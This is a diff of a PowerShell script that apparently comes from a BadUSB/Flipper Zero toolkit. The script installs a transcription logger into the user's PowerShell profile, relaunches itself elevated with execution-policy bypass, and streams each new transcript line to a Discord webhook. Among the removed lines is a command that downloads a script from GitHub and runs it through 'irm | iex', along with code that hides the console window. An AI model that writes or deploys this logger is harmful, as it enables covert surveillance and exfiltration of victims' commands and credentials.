@@ -1,16 +1,10 @@
-
-if ($dc.Length -eq 0){
-write-host "No webhook supplied"
-}
-
-$hideWindow = 0 # 1 = Hidden
+$webhookUrl = "$dc"
 
 [Console]::BackgroundColor = "Black"
 [Console]::SetWindowSize(60, 20)
 Clear-Host
 [Console]::Title = "Powershell Logging"
 
-$webhookUrl = "$dc"
 Test-Path $Profile
 $directory = Join-Path ([Environment]::GetFolderPath("MyDocuments")) WindowsPowerShell
 $ps1Files = Get-ChildItem -Path $directory -Filter *.ps1
@@ -29,8 +23,9 @@ Function RestartScript{
         Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
     }
     else{
-        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$dc = $dc; irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Global-PS-Trascription-to-Discord/main.ps1 | iex") -Verb RunAs
+        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C ") -Verb RunAs
     }
+
     exit
 }
 
@@ -107,6 +102,7 @@ catch [System.Management.Automation.PSNotSupportedException]
 
 $scriptblock | Out-File -FilePath $Profile -Force
 
+
 function Send-ToDiscord {
     param (
         [string]$WebhookUrl,
@@ -149,26 +145,10 @@ $onChangeAction = {
         $newContent = $content.Substring($lastPosition)
         Send-ToDiscord -WebhookUrl $webhookUrl -Content $newContent
         $lastPositions[$file] = $content.Length
-        $newContent = $null
     }
 }
 
 Register-ObjectEvent -InputObject $watcher -EventName "Changed" -Action $onChangeAction
-
-If ($HideWindow -gt 0){
-    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-    $hwnd = (Get-Process -PID $pid).MainWindowHandle
-    if($hwnd -ne [System.IntPtr]::Zero){
-        $Type::ShowWindowAsync($hwnd, 0)
-    }
-    else{
-        $Host.UI.RawUI.WindowTitle = 'hideme'
-        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-        $hwnd = $Proc.MainWindowHandle
-        $Type::ShowWindowAsync($hwnd, 0)
-    }
-}
 
 while ($true) {
 
